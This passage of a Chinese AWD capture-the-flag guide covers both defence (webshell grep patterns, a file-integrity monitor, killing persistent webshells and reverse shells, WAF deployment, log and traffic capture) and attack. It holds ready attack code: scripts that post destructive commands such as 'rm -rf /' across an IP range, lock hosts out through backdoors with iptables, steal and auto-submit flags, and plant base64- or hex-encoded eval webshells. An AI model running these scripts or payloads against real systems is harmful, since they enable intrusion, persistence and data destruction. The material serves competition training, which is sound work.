            time.sleep(1)

def send():
    global socks
    while True:
        for s in socks:
            try:
                print(&quot;攻击中....&quot;)
            except Exception as ex:
                socks.remove(s)
                s.close()
        time.sleep(0.1)

One = threading.Thread(target=connect,args=())
Two = threading.Thread(target=send,args=())
One.start()
Two.start()
</code></pre>
<h1 id="防守思路"><a href="#防守思路" class="headerlink" title="防守思路"></a>防守思路</h1><h2 id="基础查杀"><a href="#基础查杀" class="headerlink" title="基础查杀"></a>基础查杀</h2><p>寻找最近20分钟修改过的文件</p>
<pre><code>find /var/www/html -name *.php -mmin -20
</code></pre>
<p>寻找行数最短的文件：</p>
<pre><code>find ./ -name &#39;*.php&#39; | xargs wc -l | sort -u
</code></pre>
<p>关键字查杀</p>
<pre><code>find . -name &#39;*.php&#39; | xargs grep -n &#39;eval(&#39;
find . -name &#39;*.php&#39; | xargs grep -n &#39;assert&#39;
find . -name &#39;*.php&#39; | xargs grep -n &#39;system()&#39;
</code></pre>
<p>查找命令执行函数</p>
<pre><code>find /var/www/html -name &quot;*.php&quot; |xargs egrep &#39;assert|eval|phpinfo\\(\\)|\\(base64_decoolcode|shell_exec|passthru|file_put_contents\\(\\.\\*\\$|base64_decode\\(&#39;
</code></pre>
<h2 id="文件监控"><a href="#文件监控" class="headerlink" title="文件监控"></a>文件监控</h2><p>脚本</p>
<pre><code># -*- coding: utf-8 -*-
#use: python file_check.py ./

import os
import hashlib
import shutil
import ntpath
import time

CWD = os.getcwd()
FILE_MD5_DICT = &#123;&#125;      # 文件MD5字典
ORIGIN_FILE_LIST = []

# 特殊文件路径字符串
Special_path_str = &#39;drops_JWI96TY7ZKNMQPDRUOSG0FLH41A3C5EXVB82&#39;
bakstring = &#39;bak_EAR1IBM0JT9HZ75WU4Y3Q8KLPCX26NDFOGVS&#39;
logstring = &#39;log_WMY4RVTLAJFB28960SC3KZX7EUP1IHOQN5GD&#39;
webshellstring = &#39;webshell_WMY4RVTLAJFB28960SC3KZX7EUP1IHOQN5GD&#39;
difffile = &#39;diff_UMTGPJO17F82K35Z0LEDA6QB9WH4IYRXVSCN&#39;

Special_string = &#39;drops_log&#39;  # 免死金牌
UNICODE_ENCODING = &quot;utf-8&quot;
INVALID_UNICODE_CHAR_FORMAT = r&quot;\\?%02x&quot;

# 文件路径字典
spec_base_path = os.path.realpath(os.path.join(CWD, Special_path_str))
Special_path = &#123;
    &#39;bak&#39; : os.path.realpath(os.path.join(spec_base_path, bakstring)),
    &#39;log&#39; : os.path.realpath(os.path.join(spec_base_path, logstring)),
    &#39;webshell&#39; : os.path.realpath(os.path.join(spec_base_path, webshellstring)),
    &#39;difffile&#39; : os.path.realpath(os.path.join(spec_base_path, difffile)),
&#125;

def isListLike(value):
    return isinstance(value, (list, tuple, set))

# 获取Unicode编码
def getUnicode(value, encoding=None, noneToNull=False):

    if noneToNull and value is None:
        return NULL

    if isListLike(value):
        value = list(getUnicode(_, encoding, noneToNull) for _ in value)
        return value

    if isinstance(value, unicode):
        return value
    elif isinstance(value, basestring):
        while True:
            try:
                return unicode(value, encoding or UNICODE_ENCODING)
            except UnicodeDecodeError, ex:
                try:
                    return unicode(value, UNICODE_ENCODING)
                except:
                    value = value[:ex.start] + &quot;&quot;.join(INVALID_UNICODE_CHAR_FORMAT % ord(_) for _ in value[ex.start:ex.end]) + value[ex.end:]
    else:
        try:
            return unicode(value)
        except UnicodeDecodeError:
            return unicode(str(value), errors=&quot;ignore&quot;)

# 目录创建
def mkdir_p(path):
    import errno
    try:
        os.makedirs(path)
    except OSError as exc:
        if exc.errno == errno.EEXIST and os.path.isdir(path):
            pass
        else: raise

# 获取当前所有文件路径
def getfilelist(cwd):
    filelist = []
    for root,subdirs, files in os.walk(cwd):
        for filepath in files:
            originalfile = os.path.join(root, filepath)
            if Special_path_str not in originalfile:
                filelist.append(originalfile)
    return filelist

# 计算机文件MD5值
def calcMD5(filepath):
    try:
        with open(filepath,&#39;rb&#39;) as f:
            md5obj = hashlib.md5()
            md5obj.update(f.read())
            hash = md5obj.hexdigest()
            return hash
    except Exception, e:
        print u&#39;[!] getmd5_error : &#39; + getUnicode(filepath)
        print getUnicode(e)
        try:
            ORIGIN_FILE_LIST.remove(filepath)
            FILE_MD5_DICT.pop(filepath, None)
        except KeyError, e:
            pass

# 获取所有文件MD5
def getfilemd5dict(filelist = []):
    filemd5dict = &#123;&#125;
    for ori_file in filelist:
        if Special_path_str not in ori_file:
            md5 = calcMD5(os.path.realpath(ori_file))
            if md5:
                filemd5dict[ori_file] = md5
    return filemd5dict

# 备份所有文件
def backup_file(filelist=[]):
    # if len(os.listdir(Special_path[&#39;bak&#39;])) == 0:
    for filepath in filelist:
        if Special_path_str not in filepath:
            shutil.copy2(filepath, Special_path[&#39;bak&#39;])

if __name__ == &#39;__main__&#39;:
    print u&#39;---------start------------&#39;
    for value in Special_path:
        mkdir_p(Special_path[value])
    # 获取所有文件路径，并获取所有文件的MD5，同时备份所有文件
    ORIGIN_FILE_LIST = getfilelist(CWD)
    FILE_MD5_DICT = getfilemd5dict(ORIGIN_FILE_LIST)
    backup_file(ORIGIN_FILE_LIST) # TODO 备份文件可能会产生重名BUG
    print u&#39;[*] pre work end!&#39;
    while True:
        file_list = getfilelist(CWD)
        # 移除新上传文件
        diff_file_list = list(set(file_list) ^ set(ORIGIN_FILE_LIST))
        if len(diff_file_list) != 0:
            # import pdb;pdb.set_trace()
            for filepath in diff_file_list:
                try:
                    f = open(filepath, &#39;r&#39;).read()
                except Exception, e:
                    break
                if Special_string not in f:
                    try:
                        print u&#39;[*] webshell find : &#39; + getUnicode(filepath)
                        shutil.move(filepath, os.path.join(Special_path[&#39;webshell&#39;], ntpath.basename(filepath) + &#39;.txt&#39;))
                    except Exception as e:
                        print u&#39;[!] move webshell error, &quot;%s&quot; maybe is webshell.&#39;%getUnicode(filepath)
                    try:
                        f = open(os.path.join(Special_path[&#39;log&#39;], &#39;log.txt&#39;), &#39;a&#39;)
                        f.write(&#39;newfile: &#39; + getUnicode(filepath) + &#39; : &#39; + str(time.ctime()) + &#39;\\n&#39;)
                        f.close()
                    except Exception as e:
                        print u&#39;[-] log error : file move error: &#39; + getUnicode(e)

        # 防止任意文件被修改,还原被修改文件
        md5_dict = getfilemd5dict(ORIGIN_FILE_LIST)
        for filekey in md5_dict:
            if md5_dict[filekey] != FILE_MD5_DICT[filekey]:
                try:
                    f = open(filekey, &#39;r&#39;).read()
                except Exception, e:
                    break
                if Special_string not in f:
                    try:
                        print u&#39;[*] file had be change : &#39; + getUnicode(filekey)
                        shutil.move(filekey, os.path.join(Special_path[&#39;difffile&#39;], ntpath.basename(filekey) + &#39;.txt&#39;))
                        shutil.move(os.path.join(Special_path[&#39;bak&#39;], ntpath.basename(filekey)), filekey)
                    except Exception as e:
                        print u&#39;[!] move webshell error, &quot;%s&quot; maybe is webshell.&#39;%getUnicode(filekey)
                    try:
                        f = open(os.path.join(Special_path[&#39;log&#39;], &#39;log.txt&#39;), &#39;a&#39;)
                        f.write(&#39;diff_file: &#39; + getUnicode(filekey) + &#39; : &#39; + getUnicode(time.ctime()) + &#39;\\n&#39;)
                        f.close()
                    except Exception as e:
                        print u&#39;[-] log error : done_diff: &#39; + getUnicode(filekey)
                        pass
        time.sleep(2)
        # print &#39;[*] &#39; + getUnicode(time.ctime())
</code></pre>
<p>运行</p>
<pre><code>python jiankong.py  /var/www/html
</code></pre>
<h2 id="alias起别名"><a href="#alias起别名" class="headerlink" title="alias起别名"></a>alias起别名</h2><pre><code>alias cat=&quot;echo nothing&quot;
</code></pre>
<p>删除</p>
<pre><code>unalias -a
</code></pre>
<p>对方执行cat /flag命令的时候回显就是错误flag</p>
<pre><code>alias cat=&quot;echo `date`|md5sum|cut -d &#39; &#39; -f1||&quot;
</code></pre>
<p>获取 flag 一般是 curl <a target="_blank" rel="noopener" href="http://xxx.com/flag.txt">http://xxx.com/flag.txt</a></p>
<pre><code>alias curl=&#39;echo fuckoff&#39; #权限要求较低，可以在这里改成虚假的flag
# 或者
chmod -x curl #权限要求较高
/usr/bin curl路径
</code></pre>
<h2 id="杀不死马"><a href="#杀不死马" class="headerlink" title="杀不死马"></a>杀不死马</h2><p>查看进程</p>
<pre><code>root@1177499f5b23:~# ps aux | grep www-data
www-data  4819  0.0  0.4 315808  9016 ?        S    Dec16   0:00 apache2 -D FOREGROUND
www-data  6663  0.0  0.6 316188 13460 ?        S    Dec16   0:00 apache2 -D FOREGROUND
www-data  6675  0.0  0.3 315620  6976 ?        S    Dec16   0:00 apache2 -D FOREGROUND
www-data  6690  0.0  0.4 315808  9016 ?        S    Dec16   0:00 apache2 -D FOREGROUND
www-data  6693  0.0  0.4 315800  9056 ?        S    Dec16   0:00 apache2 -D FOREGROUND
www-data  7170  0.0  0.6 316312 14100 ?        S    Dec16   0:00 apache2 -D FOREGROUND
www-data  7239  0.0  0.6 316172 14020 ?        S    Dec16   0:00 apache2 -D FOREGROUND
www-data  7526  0.0  0.4 315620  8364 ?        S    Dec16   0:00 apache2 -D FOREGROUND
www-data  8380  0.0  0.6 316188 12612 ?        S    Dec16   0:00 apache2 -D FOREGROUND
www-data 22554  0.0  0.3 315564  7416 ?        S    03:10   0:00 apache2 -D FOREGROUND
root     25353  0.0  0.0   8868  1544 pts/1    S+   05:25   0:00 grep --color=auto www-data
</code></pre>
<p>(1)杀进程</p>
<pre><code>kill -9 对应的进程号
</code></pre>
<p>执行命令</p>
<pre><code>ps aux | grep www-data | awk &#39;&#123;print $2&#125;&#39; | xargs kill -9
ps aux | grep www-data | grep -v grep | awk &#39;&#123;print $2&#125;&#39; | xargs kill -9
</code></pre>
<p>原理</p>
<pre><code>ps aux
列出进程信息

grep www-data
在进程信息中找到需要杀死的进程

grep -v grep
在进程信息中剔除带grep的信息

awk ‘&#123;print $2&#125;’
提取字符串行内容的第2个字段，也就是当前示例的进程号

xargs kill -9
将进程号作为参数传递给kill -9这个命令
</code></pre>
<p>然后删除不死马文件</p>
<p>(2)重启php等web服务，不推荐使用</p>
<pre><code>service php-fpm restart
</code></pre>
<p>(3)用一个ignore_user_abort(true)脚本，一直竞争写入（断断续续）。usleep要低于对方不死马设置的值。</p>
<pre><code>&lt;?php
while (1) &#123;
    $pid=1234;  #不死马进程
    @unlink(&#39;demo.php&#39;);
    exec(&#39;kill -9 $pid&#39;);
&#125;
?&gt;

&lt;?php
    ignore_user_abort(true);
    set_time_limit(0);
    unlink(__FILE__);
    $file = &#39;.3.php&#39;;
    $code = &#39;hi springbird !&#39;;
    //pass=pass
    while (1)&#123;
        file_put_contents($file,$code);
        system(&#39;touch -m -d &quot;2018-12-01 09:10:12&quot; .3.php&#39;);
    //    usleep(5000);
          usleep(1000);
    &#125;
?&gt;
</code></pre>
<p>(4)创建一个和不死马生成的马一样名字的文件夹 mkdir 1.php</p>
<p>循环创建</p>
<pre><code>#!/bin/bash
dire=&quot;/var/www/html/.base.php/&quot;
file=&quot;/var/www/html/.base.php&quot;
rm -rf $file
mkdir $dire
./xx.sh
</code></pre>
<h2 id="清除反弹shell"><a href="#清除反弹shell" class="headerlink" title="清除反弹shell"></a>清除反弹shell</h2><p>查看进程</p>
<pre><code>ps -ef / px -aux
</code></pre>
<p>出现www-data权限的/bin/sh一般为nc</p>
<p>然后杀进程</p>
<pre><code>kill `ps -aux | grep www-data | grep apache2 | awk &#39;&#123;print $2&#125;&#39;`
</code></pre>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>在AWD中，一般都需要专门防御加固自己服务器的环节，但加固的很多操作都会涉及到root权限，如果直接给root权限最好，但一般只会给一个普通权限账号，这时候往往就需要给服务器提权了。</p>
<p>关于提权，通常我们要根据kernel版本号找到对应的poc，平时我们可以收集测试一些比较新的提权poc，以备不时之需。</p>
<p>影响范围比较大的漏洞，可以用来提权：</p>
<pre><code>CVE-2017-6074 (DCCP双重释放漏洞 &gt; 2.6.18 ) ：
DCCP双重释放漏洞可允许本地低权限用户修改Linux内核内存，导致拒绝服务(系统崩溃)或者提升权限，获得系统的管理访问权限

CVE-2016-5195(脏牛，kernel 2.6.22 &lt; 3.9 (x86/x64)) ：
低权限用户可修改root用户创建的文件内容，如修改 /etc/passwd，把当前用户的 uid 改成 0 即可提升为root权限

CVE-2016-8655(Ubuntu 12.04、14.04，Debian 7、8) ：
条件竞争漏洞，可以让低权限的进程获得内核代码执行权限
POC：&lt;https://www.seebug.org/vuldb/ssvid-92567&gt;

CVE-2017-1000367(sudo本地提权漏洞 ) ：L
inux Kernel Stack Clash安全漏洞。该漏洞是由于操作系统内存管理中的一个堆栈冲突漏洞，它影响Linux，FreeBSD和OpenBSD，NetBSD，Solaris，i386和AMD64，攻击者可以利用它破坏内存并执行任意代码 。

CVE-2016-1247(Nginx权限提升漏洞) ：
Nginx服务在创建log目录时使用了不安全的权限设置，可造成本地权限提升，恶意攻击者能够借此实现从 nginx/web 的用户权限 www-data 到 root 用户权限的提升。
POC：&lt;https://legalhackers.com/advisories/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html&gt;
</code></pre>
<h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>基本原则</p>
<ul>
<li>能修复的尽量修复；</li>
<li>不能修复的先注释源码，不影响页面显示再删除；</li>
<li>站点和对应的功能尽可能不宕机；</li>
</ul>
<p>技巧</p>
<ul>
<li>设置 waf，如 load_file；</li>
<li>对于一些成型的 CMS，找到相应版本号后，对其 diff；</li>
<li>修改弱口令用户；</li>
<li>对于觉得危险函数的地方直接使用die()；</li>
</ul>
<p>比如文件上传漏洞修复，可以在upload目录下写.htaccess禁止php文件执行</p>
<pre><code>&lt;Directory &quot;/var/www/html/upload&quot;&gt;
Options -ExecCGI -Indexes
AllowOverride None
RemoveHandler .php .phtml .php3 .pht .php4 .php5 .php7 .shtml
RemoveType .php .phtml .php3 .pht .php4 .php5 .php7 .shtml
php_flag engine off
&lt;FilesMatch &quot;.+\\.ph(p[3457]?|t|tml)$&quot;&gt;
deny from all
&lt;/FilesMatch&gt;
&lt;/Directory&gt;
</code></pre>
<p>一些修复技巧参考：<a target="_blank" rel="noopener" href="https://qftm.github.io/2019/08/03/AWD-Bugs-Fix/">AWD攻防赛之各类漏洞FIX方案 | Qftm</a></p>
<h2 id="日志分析"><a href="#日志分析" class="headerlink" title="日志分析"></a>日志分析</h2><p>命令行动态查看日志</p>
<pre><code>tailf /var/log/apache2/access.log
</code></pre>
<p>还可以使用工具进行日志分析：<a target="_blank" rel="noopener" href="https://security.tencent.com/index.php/opensource/detail/15">LogForensics 腾讯实验室 /web日志取证分析工具</a></p>
<p>日志的存放地址</p>
<pre><code>/var/log/apache2/
/usr/local/apache2/logs
/usr/nginx/logs/
</code></pre>
<p>为了对其他防守方进行干扰，可以利用脚本发生大量垃圾数据包，混淆视觉，给对方人员增加检测的难度，浪费对方的时间。</p>
<pre><code>import requests
import time

def scan_attack():
    file=&#123;&#39;shell.php&#39;,&#39;admin.php&#39;,&#39;web.php&#39;,&#39;login.php&#39;,&#39;1.php&#39;,&#39;index.php&#39;&#125;
    payload=&#123;&#39;cat /flag&#39;,&#39;ls -al&#39;,&#39;rm -f&#39;,&#39;echo 1&#39;,&#39;echo 1 /proc/sys/net/ipv4/ip_forward&#39;,&#39;rm -rf / --no-preserve-root&#39;&#125;
    while(1):
        for i in range(1, 50):
            for ii in file:
                url=&#39;&lt;http://192.168.182&gt;.&#39;+ str(i)+&#39;/&#39;+ii
                print(url)
                for iii in payload:
                    data=&#123;
                        &#39;payload&#39;:iii
                    &#125;
                    try:
                        requests.post(url,data=data)
                        print(&quot;正在搅屎:&quot;+str(i)+&#39;|&#39;+ii+&#39;|&#39;+iii)
                        time.sleep(0.1)
                    except Exception as e:
                        time.sleep(0.1)
                        pass

if __name__ == &#39;__main__&#39;:
    scan_attack()
</code></pre>
<h2 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h2><p>在比赛服务器上抓取流量包，需要的权限比较高，一般比赛用不到</p>
<pre><code>sudo tcpdump -s 0 -w flow.pcap port 80
# 然后使用 scp 写个脚本实时将流量包拷贝到本地

tcpdump tcp -i eth1 -t -s 0 -c 100 and dst port ! 22 and src net 192.168.1.0/24 -w ./target.cap
命令拆解分析：
1、tcp: ip icmp arp rarp 和 tcp、udp、icmp这些选项等都要放到第一个参数的位置，用来过滤数据报的类型
2、-i eth1 : 只抓经过接口eth1的包
3、-t : 不显示时间戳
4、-s 0 : 抓取数据包时默认抓取长度为68字节。加上-S 0 后可以抓到完整的数据包
5、-c 100 : 只抓取100个数据包
6、dst port ! 22 : 不抓取目标端口是22的数据包
7、src net 192.168.1.0/24 : 数据包的源网络地址为192.168.1.0/24
8、-w ./target.cap : 保存成cap文件，方便用wireshark分析
</code></pre>
<p>PHP版流量监控</p>
<pre><code>&lt;?php

  date_default_timezone_set(&#39;Asia/Shanghai&#39;);

$ip = $_SERVER[&quot;REMOTE_ADDR&quot;]; //记录访问者的ip

$filename = $_SERVER[&#39;PHP_SELF&#39;]; //访问者要访问的文件名

$parameter = $_SERVER[&quot;QUERY_STRING&quot;]; //访问者要请求的参数

$time = date(&#39;Y-m-d H:i:s&#39;,time()); //访问时间

$logadd = &#39;来访时间：&#39;.$time.&#39;--&gt;&#39;.&#39;访问链接：&#39;.&#39;http://&#39;.$ip.$filename.&#39;?&#39;.$parameter.&quot;\\r\\n&quot;;

// log记录

$fh = fopen(&quot;log.txt&quot;, &quot;a&quot;);

fwrite($fh, $logadd);

fclose($fh);

?&gt;
</code></pre>
<p>一个针对php的web流量抓取、分析的应用：<a target="_blank" rel="noopener" href="https://github.com/wupco">wupco</a>/<a target="_blank" rel="noopener" href="https://github.com/wupco/weblogger">weblogger</a></p>
<p>使用方法</p>
<pre><code>cd /var/www/html/ (or other web dir)

   git clone &lt;https://github.com/wupco/weblogger.git&gt;

   chmod -R 777 weblogger/

   open &lt;http://xxxxx/weblogger/install.php&gt; in Web browser

   install it
</code></pre>
<h2 id="-1"><a href="#-1" class="headerlink" title></a></h2><h2 id="WAF"><a href="#WAF" class="headerlink" title="WAF"></a>WAF</h2><p>waf的作用：</p>
<p>1.最重要是分析流量，别人攻击我们的时候，我们可以看到别人的攻击方式。这样的话即使我们找 不到攻击点，非常苦恼的时候，我们就可以分析流量，使用别人的攻击方式。</p>
<p>2.可以直接进行防御，类似于一台防火墙（一般的比赛是不允许使用的，毕竟比赛时间短，就根本绕不过去waf，那比赛就没意思了）</p>
<p>有些比赛是不允许上通用waf的，check机制可能会check到waf过滤的参数，导致宕机，waf部署需要谨慎，还需要注意的是：上完waf检查服务是否可用，部分检查允许使用部分小的waf，会检查页面完整性、服务完整性。</p>
<p>常用的waf使用方法，是用你要保护的文件去包含这个waf.php。比如说，你要保护select.php，那么你就在select.php里面写上一行include ‘./waf.php’或者 require_once(‘waf.php’);</p>
<p>如果你要保护所有文件，那么就在config这种配置文件里包含waf，因为这种config的文件，一般会被大部分功能页面调用</p>
<p>网上很多waf脚本，这里介绍几个waf项目</p>
<p><strong>1.AWD_PHP_WAF</strong></p>
<p>项目地址：<a target="_blank" rel="noopener" href="https://github.com/NonupleBroken/AWD_PHP_WAF">GitHub - NonupleBroken/AWD_PHP_WAF: a PHP WAF for AWD</a></p>
<p>使用方法：</p>
<p>使用前先修改config.php内的密码，密码使用sha256加密</p>
<pre><code>上waf：
$ find . -path ./waffffff -prune -o -type f -name &quot;*.php&quot; -print | xargs sed -i &quot;s/&lt;?php/&lt;?php include_once(\\&quot;\\/var\\/www\\/html\\/waffffff\\/waf.php\\&quot;);/g&quot;

下waf：
$ find . -path ./waffffff -prune -o -type f -name &quot;*.php&quot; -print | xargs sed -i &quot;s/&lt;?php include_once(\\&quot;\\/var\\/www\\/html\\/waffffff\\/waf.php\\&quot;);/&lt;?php/g&quot;
</code></pre>
<p>比如访问 web 目录下的/waffffff/admin.php?password=123456</p>
<p><strong>2.CTF-WAF</strong></p>
<p>项目地址：<a target="_blank" rel="noopener" href="https://github.com/sharpleung/CTF-WAF">GitHub - sharpleung/CTF-WAF: 针对CTF线下赛的通用WAF,带流量转发，日志审计功能。</a></p>
<p><strong>3.awd-watchbird</strong></p>
<p>这是个通防waf，支持流量转发和替换flag</p>
<p>项目地址：<a target="_blank" rel="noopener" href="https://github.com/leohearts/awd-watchbird">GitHub - leohearts/awd-watchbird: A powerful PHP WAF for AWD</a></p>
<p>1.打包好好之后直接上传到html目录下，回到终端，在上传的waf目录下，使用命令</p>
<pre><code>php watchbird.php --install /var/www/html
</code></pre>
<p>这样就能使每个页面的php代码包含到waf下</p>
<p>2.运行waf 之后，打开我们的web 页面，在任意一个php 页面后面输入?watchbird=ui，就会进入到waf 配置页面然后设置密码(注意：第一次打开需要设置密码)</p>
<p>3.配置好之后就能进入内部网页</p>
<p><strong>4.AoiAWD</strong></p>
<p>项目地址：<a target="_blank" rel="noopener" href="https://github.com/DasSecurity-HatLab/AoiAWD">GitHub - DasSecurity-HatLab/AoiAWD: AoiAWD-专为比赛设计，便携性好，低权限运行的EDR系统。</a></p>
<p>使用方法：<a target="_blank" rel="noopener" href="https://www.wlhhlc.top/posts/16692/">AoiAWD-萌新的得分利器</a></p>
<p>下载好，自己去编译或者找编译好的直接用</p>
<h2 id="防御搅屎"><a href="#防御搅屎" class="headerlink" title="防御搅屎"></a>防御搅屎</h2><p>在加固阶段，每个堡垒机都有一个Web在运行。而这些站点可能存在相应的漏洞和后门。基本上都会有shell留在隐秘的角落…</p>
<p>所以我们就可以通过前期搜寻到的后门，进行操作。这里直接用linux的防火墙进行关闭即可。</p>
<p>在正常情况下：这样的话就直接把系统的后门全杀掉了。只允许22 80 21端口可以进行访问。</p>
<p>首先开启 22 80 21</p>
<pre><code>iptables -A INPUT -p tcp --dport 80 -j ACCEPT
iptables -A INPUT -p tcp --dport 22 -j ACCEPT
iptables -A INPUT -p tcp --dport 21 -j ACCEPT
</code></pre>
<p>然后关闭</p>
<pre><code>iptables -A INPUT -j DROP
</code></pre>
<p>在手动一个个连shell搅shi的话，是非常慢的。于是写了个小脚本。</p>
<p>遍历整个IP段，并将防火墙开启全部屏蔽掉~~</p>
<pre><code>import requests
url = &quot;&lt;http://192.168.182&gt;&quot;
port=&#39;80&#39;
shell = &quot;/shell.php&quot;
passwd = &quot;a&quot;
payloads = &#123;
    passwd:&quot;system(\\&#39;iptables -A INPUT -j DROP&#39;);&quot;
&#125;
for i in range(1,254):
    urls = url+&quot;.&quot;+str(i)+&quot;:&quot;+port+shell
    print(urls+&quot;\\n&quot;)
    try:
        res = requests.post(urls,payloads,timeout=1)
        print(res.text)
    except:
        print(&quot;未找到主机&quot;)
</code></pre>
<h1 id="编写批量脚本"><a href="#编写批量脚本" class="headerlink" title="编写批量脚本"></a>编写批量脚本</h1><p>以下脚本来自于我比赛时写的垃圾脚本，大佬勿喷。</p>
<h3 id="1-利用后门getflag"><a href="#1-利用后门getflag" class="headerlink" title="1.利用后门getflag"></a>1.利用后门getflag</h3><p>单个shell获取flag</p>
<pre><code>import requests

url=&quot;&lt;http://192.168.182.130/include/shell.php&gt;&quot;
passwd=&quot;admin_ccmd&quot;
payload = &#123;passwd: &#39;system(\\&#39;cat /f*\\&#39;);&#39;&#125;
res=requests.post(url,payload)
print(res.text)
</code></pre>
<h3 id="2-后门批量getflag"><a href="#2-后门批量getflag" class="headerlink" title="2.后门批量getflag"></a>2.后门批量getflag</h3><p>针对端口变化利用后门批量获取flag</p>
<pre><code>import requests

url1=&quot;&lt;http://192.168.182.130&gt;:&quot;
url2=&quot;&quot;

flaglist=[]

path=&quot;/include/shell.php&quot;
passwd=&quot;admin_ccmd&quot;

#payload = &#123;passwd: &#39;system(\\&#39;cat /f*\\&#39;);&#39;&#125;
payload = &#123;passwd: &#39;system(\\&#39;cat /flag\\&#39;);&#39;&#125;

i = 0

for url2 in range(8801,8805):
    url = url1 + str(url2) +path

    res=requests.post(url,payload)
    try:
        print(url1 + str(url2),res.text)
        # flag存入列表中
        flaglist.append(str(res.text))
        #print(flaglist[i])
        i += 1
    except:
        pass
</code></pre>
<h3 id="3-利用后门批量getflag并提交"><a href="#3-利用后门批量getflag并提交" class="headerlink" title="3.利用后门批量getflag并提交"></a>3.利用后门批量getflag并提交</h3><p>burp抓包，发现flag以json形式传输</p>
<pre><code>POST /api/flag HTTP/1.1
Host: 192.168.182.130:39999
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0
Accept: application/json, text/plain, */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/json;charset=utf-8
Authorization: 9ad36c305d6a2d2514434a4c10e7e13f
Content-Length: 55
Origin: &lt;http://192.168.182.130:39999&gt;
Connection: close
Referer: &lt;http://192.168.182.130:39999/&gt;

&#123;&quot;flag&quot;:&quot;SL&#123;7a2ecc20361b7a104798b6bba6222b3972e114a2&#125;&quot;&#125;
</code></pre>
<p>编写脚本自动获取flag并提交</p>
<pre><code># coding: UTF-8
import requests
import json

url1=&quot;&lt;http://xxxx&gt;:&quot;
url2=&quot;&quot;

flaglist=[]

path=&quot;/include/shell.php&quot;
passwd=&quot;admin_ccmd&quot;

flagadd=&quot;&lt;http://xxxx:8801/api/flag&gt;&quot;   #提交flag的地址

#payload = &#123;passwd: &#39;system(\\&#39;cat /f*\\&#39;);&#39;&#125;
payload = &#123;passwd: &#39;system(\\&#39;cat /flag\\&#39;);&#39;&#125;

headers=&#123;
        &#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0&#39;,
    &#125;
headersflag=&#123;
        &#39;Host&#39;: &#39;xxxx&#39;,
        &#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0&#39;,
        &#39;Accept&#39;: &#39;application/json, text/plain, */*&#39;,
        &#39;Accept-Language&#39;: &#39;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&#39;,
        &#39;Content-Type&#39;: &#39;application/json;charset=utf-8&#39;,
        &#39;Authorization&#39;: &#39;bada82467423a6526d4d25abbe8cc43a&#39;,
        &#39;Origin&#39;: &#39;&lt;http://xxxx&gt;&#39;,
        &#39;Referer&#39;: &#39;&lt;http://xxxx/&gt;&#39;,
    &#125;

i = 0

for url2 in range(8802,8810):
    url = url1 + str(url2) +path
    #print(url1 + str(url2))
    res=requests.post(url,payload, headers=headers)
    try:
        print(url1 + str(url2),res.text)
        # flag存入列表中
        flaglist.append(str(res.text))
        #print(flaglist[i])
        body = &#123;&quot;flag&quot;: str(flaglist[i])&#125;
        res = requests.post(flagadd, headers=headersflag, data=json.dumps(body))
        i += 1
    except:
        pass
</code></pre>
<p>如果嫌写脚本麻烦，可以把flag存入字典，利用burp爆破，也可以实现批量提交flag。不过大括号<code>&#123;&#125;</code>可能会被编码导致flag错误。</p>
<h3 id="4-利用后门写shell"><a href="#4-利用后门写shell" class="headerlink" title="4.利用后门写shell"></a>4.利用后门写shell</h3><p>预留后门可能会被删除，要想持续拿分需要写shell，这里利用命令执行和代码执行来写马</p>
<p><strong>利用命令执行写马</strong></p>
<pre><code>1.Linux下写shell
$ echo &quot;&lt;?php @eval(\\$_POST[123]); ?&gt;&quot; &gt; webshell.php
$ echo PD9waHAgQGV2YWwoJF9QT1NUWzEyM10pOyA/Pg==|base64 -d &gt; webshell.php   #base64编码绕过
$ echo 3c3f706870206576616c28245f504f53545b3132335d293b203f3e|xxd -r -ps &gt; webshell.php #xxd绕过

2.windows下写shell
&gt;echo ^&lt;?php eval($^_POST[123]); ?^&gt; &gt; webshell.php
</code></pre>
<p><strong>利用代码执行写马</strong></p>
<pre><code>?code=fputs(fopen(&#39;./webshell.php.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_POST[123]);?&gt;&#39;);

?code=file_put_contents(&#39;webshell.php.php&#39;, &#39;&lt;?php @eval($_POST[123]); ?&gt; &#39;);

?code=file_put_contents($_POST[f], $_POST[d]);
post: f=webshell.php&amp;d=&lt;?php @eval($_POST[123]); ?&gt;
</code></pre>
<p>然后利用脚本实现</p>
<pre><code># coding: UTF-8
import requests

url = &quot;&lt;http://192.168.182.130:8808&gt;&quot;

shell_path = url + &quot;/include/shell.php&quot;
shell_passwd = &quot;admin_ccmd&quot;

#利用预留后门
payload = &#123;shell_passwd: &#39;system(\\&#39;cat /f*\\&#39;);&#39;&#125;
res = requests.post(shell_path, payload)
print(res.text)

#payload1利用预留后门上传shell
payload1 = &#123;shell_passwd: &#39;system(\\&#39;echo &quot;&lt;?php @eval(\\$_POST[atkx]);?&gt;&quot; &gt; /var/www/html/atkx.php\\&#39;);&#39;&#125;
res = requests.post(shell_path, payload1)
print(&quot;shell已上传&quot;)

#payload2利用预留后门上传shell，并getflag
my_shell_path = url + &quot;/atkx.php&quot;
my_shell_passwd = &quot;atkx&quot;
payload2 = &#123;my_shell_passwd: &#39;system(\\&#39;cat /f*\\&#39;);&#39;&#125;
res = requests.post(my_shell_path, payload2)
print(res.text)
</code></pre>
<p>批量后门写shell</p>
<pre><code>import requests

url_head=&quot;&lt;http://192.168.182.130&gt;&quot;
for url2 in range(8801,8805):
    try:
        url =  url_head+&quot;:&#123;&#125;&quot;.format(url2)

        shell_path = url + &quot;/include/shell.php&quot;
        shell_passwd = &quot;admin_ccmd&quot;
        print(shell_path)

        #payload1利用预留后门上传shell
